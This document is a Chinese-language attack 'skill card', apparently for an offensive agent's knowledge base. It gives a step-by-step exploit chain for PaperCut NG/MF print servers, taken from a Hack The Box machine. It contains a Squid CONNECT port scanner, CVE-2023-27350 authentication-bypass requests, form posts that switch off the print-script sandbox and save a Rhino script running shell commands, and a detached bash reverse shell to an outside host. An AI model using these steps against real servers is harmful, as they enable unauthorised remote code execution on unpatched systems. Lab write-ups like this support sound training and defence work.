---
name: 'papercut-ng-attacks'
description: '目标是 PaperCut NG/MF 打印管理服务器（9191/9192/9193/9195 上的 Java Web 应用，页脚写着 "PaperCut NG x.y.z (Build nnnnn)"）时加载：Squid 前向代理内网侦察 → CVE-2023-27350 认证绕过（**22.0.6 起 POST /app 必须带 Origin/Referer**）→ **两条代码执行路径**（ConfigEditor 打开打印脚本 / 自定义用户源 custom user program）以及"哪条能用"的三层判死判据。（检索词：papercut/papercut-ng/PaperCut NG/9191/9192/9193/9195/cve-2023-27350/27350/print script/打印脚本/print-and-device.script.enabled/print.script.sandboxed/ConfigEditor/quickFindForm/OptionsUserSync/custom user program/custom auth program/自定义用户源/Rhino/java.lang.Runtime/PrinterDetails/selectPrinter/l1001/squid/3128/前向代理/内网端口扫描/serialVersionUID/Origin/Referer/CSRF/SetupCompleted）'
whenToUse: '扫到 9191（或 9192/9193/9195）返回 PaperCut 登录页、或内网只有 Squid 代理够得着的打印管理服务器时加载；先做认证绕过，再按"哪条代码执行路径可用"分派。'
metadata: { domain: web, tier: T3 }
---

# PaperCut NG/MF：从认证绕过到两条代码执行路径

> ⚠️ **一手实战回灌**（2026-09-30 打 HTB **Bamboo**，Linux/Medium）——本卡命令在 PaperCut NG **22.0.6 (Build 64379)** 上逐条实测；
> **不是**官方 WP 语料。标 🔷 的是推论/未验证项。
> 同版本的另一条流传更广的路线（exploit-db 51452"自定义用户源"）在本机**判死**，判据见「模式 3」——
> 那一节是本卡最有价值的部分：**它教你怎么在 20 分钟内放弃一条错的路线，而不是烧 23 分钟修 payload。**

## 触发信号

| 观察到的现象 | 说明 |
|---|---|
| `nmap` 只开出 22 + **3128**（`squid/5.9`），其余端口 filtered | 典型"内网只能通过代理摸"的形态 |
| 经代理 `CONNECT 127.0.0.1:9191` 得到 `302 → /user`，页脚 `PaperCut NG 22.0.6 (Build 64379)` | `/app?service=page/Login` 正文里直接有 **Version Details** |
| 静态资源 URL 带 `?64379papercut`（如 `/css/style.css?64379papercut`） | build 号指纹，用来对齐公开 PoC 的版本区间 |
| `GET /app?service=page/SetupCompleted` 返回 **200** + `Set-Cookie: JSESSIONID=…` | 未认证即可访问 ⇒ CVE-2023-27350 成立 |
| 响应头有 `X-Cache: MISS from <hostname>` / `Via: 1.1 <host> (squid/5.9)` | 你拿到的是一个 **Squid 前向代理**，不是应用自身的 header |
| 内网另有 **9173/9174**（Print Deploy）、9192/9193/9195 | 同机的其它面，本卡不覆盖 |

## 前置验证

```bash
# 0) 只有代理可达时的内网扫描：CONNECT 对任意 host:port 全放行，60 并发扫 65k 数分钟
#    （拒绝的端口 Squid 秒回 503 ERR_CONNECT_FAIL，可据此判定；200 = 通）
python3 squidscan.py <squid_ip>:3128 127.0.0.1 1-65535 --connect --workers 60

# 1) 版本：不信 nmap 的 http-title，登录页正文里有 Version Details
curl -s -x http://<squid>:3128 'http://127.0.0.1:9191/app?service=page/Login' | grep -A2 'Version Details'

# 2) 绕过可用性（200 + 新 JSESSIONID = 可用）
curl -s -i -x http://<squid>:3128 'http://127.0.0.1:9191/app?service=page/SetupCompleted' | head -12

# 3) 🔴 22.0.6 起所有 POST /app 都要 Origin（或 Referer），否则直接吃 403：
#    403 CSRF validation: requests from unknown origin without Origin or Origin headers
```

`squidscan.py` 要点（完整实现见 `tunneling-port-forwarding`，本质就是一个并发 CONNECT 探针）：

```python
# 每个端口开一条 TCP 到 squid，发 "CONNECT <host>:<port> HTTP/1.1\r\nHost: <host>:<port>\r\n\r\n"
# 收首行状态码：200 = 通；503 ERR_CONNECT_FAIL = 目标端口关（**能区分"关"与"代理不让我连"**）
def probe(ph, pp, host, port, t=6.0):
    s = socket.create_connection((ph, pp), timeout=t); s.settimeout(t)
    s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
    code = s.recv(256).decode('utf8', 'ignore').split(' ')[1]; s.close(); return port, code
# ThreadPoolExecutor(60) 扫 1-65535；实测拒绝端口秒回，整轮数分钟
```

## 模式 1：建立 admin 会话（CVE-2023-27350 绕过）

漏洞本身**只给认证绕过**，不给代码执行 —— 打的是"管理员本来就能干的事"。

```python
import requests
base = 'http://127.0.0.1:9191'
s = requests.Session()
s.proxies = {'http': 'http://<squid>:3128'}
H = {'User-Agent': 'Mozilla/5.0', 'Origin': base, 'Referer': base + '/app?service=page/Dashboard'}
s.get(base + '/app?service=page/SetupCompleted', headers=H)   # ← 光这一行就够，拿到 admin 会话
```

等价写法（公开 PoC 的显式表单提交，效果相同）：

```
POST /app   service=direct/1/SetupCompleted/$Form   sp=S0
            Form0=$Hidden,analyticsEnabled,$Submit
            $Hidden=true     $Submit=Login
```

判据：随后任意 `OptionsGeneral` / `OptionsUserSync` / `ConfigEditor` 页都能渲染出真实内容（不是跳 About）。

## 模式 2：代码执行路径 A —— ConfigEditor + 打印脚本（**推荐，与版本解耦**）

管理员本来就能开 PaperCut 的 **print script**（Rhino/JS 引擎）。脚本在**保存时被编译执行**，所以不需要真的来一份打印任务。

```bash
# a) 读键（同时是"我确实有配置权限"的证明）
POST /app  service=direct/1/ConfigEditor/quickFindForm   sp=S0
           Form0=$TextField,doQuickFind,clear
           $TextField=print-and-device.script.enabled     doQuickFind=Go

# b) 写值 —— 两个键都要（换另一键时 sp 仍是 S1，只换 $TextField 的上一步查询）
POST /app  service=direct/1/ConfigEditor/$Form   sp=S1
           Form1=$TextField$0,$Submit,$Submit$0
           $TextField$0=Y          $Submit=Update
#   → print-and-device.script.enabled = Y
#   → print.script.sandboxed          = N
#   回读确认：再跑一次 (a)，结果行的 <input name="$TextField$0" value="Y">

# c) 选打印机 → Scripting 标签 → 存脚本
GET  /app?service=page/PrinterList
GET  /app?service=direct/1/PrinterList/selectPrinter&sp=l1001          # l1001 = "Template printer"（默认就存在）
GET  /app?service=direct/1/PrinterDetails/printerOptionsTab.tab&sp=4   # 4 = Scripting 标签
POST /app  service=direct/1/PrinterDetails/$PrinterDetailsScript.$Form   sp=S0
           Form0=printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1
           printerId=l1001   enablePrintScript=on   $Submit$1=Apply
           scriptBody=function printJobHook(inputs, actions) {}\r\njava.lang.Runtime.getRuntime().exec(["/bin/bash","-c","<cmd>"]);
```

🔴 坑：
- **Linux 上必须用数组形式** `exec(["/bin/bash","-c","<cmd>"])`。单字符串形式按空格切分，`/bin/bash -c ...` 会被切成 `/bin/bash`、`-c`、`...` 而失效。
- 成功判据是响应里的 **`Saved successfully`**；只看到 `Apply` 回显不算。
- 命令里若带双引号，先在 JS 串里转义（`"` → `\"`、`\` → `\\`），否则表单字段被截断。
- 引擎有 ~5s 超时（厂商侧代码），要长期驻留就把子进程 **detach**：
  `setsid bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' </dev/null >/dev/null 2>&1 &`
- 想反复执行命令：**配置项只写一次**，之后每次只重发 (c) 换 `scriptBody` 即可 —— 把这条"RCE 原语可复用"记下来，掉会话时重建成本约 20 秒。

### 案例
| 机器 | 细节 |
|------|------|
| Bamboo (HTB, Medium) | Squid 3128 → 内网 9191 PaperCut NG 22.0.6 → SetupCompleted 绕过 → ConfigEditor 开 `print-and-device.script.enabled` → `l1001` Scripting 存脚本 → 回调 `GET /HIT_RHINO` 证实 RCE，落地 `papercut` 用户 |

## 模式 3：代码执行路径 B —— 自定义用户源（**先读判死判据，再决定要不要投入**）

厂商协议（PaperCutSoftware/CustomSynAndAuthentication README；盒内 `server/examples/providers/authpam.c` 源码印证）：

| 程序 | 调用形式 | stdin | stdout |
|---|---|---|---|
| Custom **user** program | `[prog] - is-valid` / `- all-users` / `- get-user-details` / `- group-members …` | 单用户查询时给用户名 | 制表符分隔的用户字段 |
| Custom **auth** program | **无参数** | `username\npassword\n` | 首行 `OK` = 通过，否则 `ERROR` |

⇒ 把两个 program 都设成 `/usr/bin/python3`：**无参数启动就是 REPL**，stdin 的 password 行被当 Python 语句执行 ⇒ 代码执行。

```
POST /app  service=direct/1/OptionsUserSync/$OptionsUserSource.$Form   sp=S0
           $PropertySelection=7,CUSTOM          # 22.0.6 的 CUSTOM 下标；22.0.4 是 3,CUSTOM
           $TextField=<Custom user program>     # 先 POST 一次切成 CUSTOM 拿到新表单，再填这两个
           $TextField$0=<Custom auth program>
           $Submit$6=Apply                      # 22.0.4 是 $Submit$4；另有 OptionsUserSourceApply=Apply
```

### 🔴 三层判死判据（22.0.6 实测**全部命中**；任一条命中就换路径，别再修 payload）

1. **老 PoC 的 `$Hidden$2` 是 Java 序列化 blob，跨版本直接 500**：
   `biz.papercut.pcng.service.OptionsUserSourceType; local class incompatible: stream classdesc serialVersionUID = 6932446866626017824, local class serialVersionUID = -4221462312852392746`
   → 这是**"换路径"信号，不是调参信号**（重造序列化对象要拿到目标版本的类，成本远高于换路径）。
2. **Apply 不落盘**：切到 CUSTOM 后无论按哪个 Apply（`$Submit$6` / `OptionsUserSourceApply`），**新会话再读仍是 `0,NONE`**（本例是 trial 0 天 + setup 未完成的实例）。
3. **同会话登录也不调用自定义 program**：页面 state 里 program 已填好（回读可见），但用 `/usr/bin/yes`、`/usr/bin/wget`、`/usr/bin/python3` 三种 program 登录都**没有任何回调**；把 payload 分别放进用户名和口令位也不触发。

### 案例
| 机器 | 细节 |
|------|------|
| Bamboo (HTB, Medium) | 路径 B 判死（三条判据全中）→ 转路径 A，25 分钟内拿到 shell。🔷 本机 PaperCut 是"未完成 setup + 过期 trial"实例，判据 2/3 是否在所有实例上都成立**未验证** |

## 模式 4：版本对齐表（别背 CVE 区间，去读版本号）

| 版本 | 自定义源 CUSTOM 下标 | Apply 按钮名 | 备注 |
|---|---|---|---|
| 22.0.4 | `3,CUSTOM` | `$Submit$4` | exploit-db 51452 的目标版本；其序列化 blob 与 22.0.6 不兼容 |
| 22.0.6 | `7,CUSTOM` | `$Submit$6` / `OptionsUserSourceApply` | 本卡实测版本；POST 需 Origin/Referer |

- CVE-2023-27350 影响 **< 22.0.8**（亦 < 20.1.7 / < 21.2.11）；同一漏洞只负责认证绕过。
- 🔴 公开研究里有一句关键话：**"PaperCut NG and MF offer multiple paths to code execution"** —— 一条路被版本挡住时，第一反应应该是"另一条路在哪"，而不是修 blob。

## 快速检查清单

```
[ ] 3128 squid 可达 → CONNECT 扫 127.0.0.1 全端口（9191/9192/9193/9195 + 9173/9174）
[ ] /app?service=page/Login 读 Version Details（+ 静态资源 ?<build>papercut 指纹）
[ ] GET /app?service=page/SetupCompleted 是否 200 + 新 JSESSIONID
[ ] 之后所有 POST /app 带上 Origin/Referer，否则 403 CSRF
[ ] ConfigEditor quickFindForm 能读键？（能读=有权限）→ 写 print-and-device.script.enabled=Y + print.script.sandboxed=N
[ ] PrinterList 是否有 l1001(Template printer)；没有就先看创建流程
[ ] 存脚本响应是否含 Saved successfully
[ ] Linux payload 必须 exec([...]) 数组形式；要驻留就 setsid detach
[ ] 若走自定义用户源：先看模式 3 的三条判死判据，命中就走路径 A
```

## 教训

1. 🔴 **"PoC 报类型/序列化不兼容" = 换路径信号，不是调试信号。** 在 22.0.4 的 blob 上烧 23 分钟，而产品自带的第二条路径与版本解耦、10 分钟打通。
2. 🔴 **先读产品自己的功能，再改第三方 payload。** 当时已经能**读到 ConfigEditor 的配置项**（=admin 权限确证），却没把"能改配置"推到"能打开打印脚本"——中间只差一次搜索。
3. 🔴 **拿到 admin 后立刻盘"这台应用有哪些功能会执行代码"**：脚本引擎（Rhino/JS）、自定义外部程序（user/auth program）、配置编辑器、更新/插件机制。这类"管理员本就能做的事"才是版本稳定的 RCE 面。
4. 页脚 build 号、`X-Cache`、302 目标这些小字就是版本判据的全部，别只信 `nmap http-title` 字段。
5. 🔷 未验证：应用侧是否存在"重启/更新 provider"的接口（与 `linux-privesc` §9.10 的"root 服务触发"问题同源）。

## 相关卡

- `web-attacks` —— 没有上述产品指纹时的通用 Web 入口
- `cms-framework-rce` —— 同类"产品自带功能 → 代码执行"的清单，本卡是它的 PaperCut 补充
- `linux-privesc` —— 拿到 `papercut` 用户之后；§9.10 讲"root 服务跑用户可写二进制时先确立重启触发"
- `tunneling-port-forwarding` —— 代理不可用（被封/需认证）时的替代隧道方案
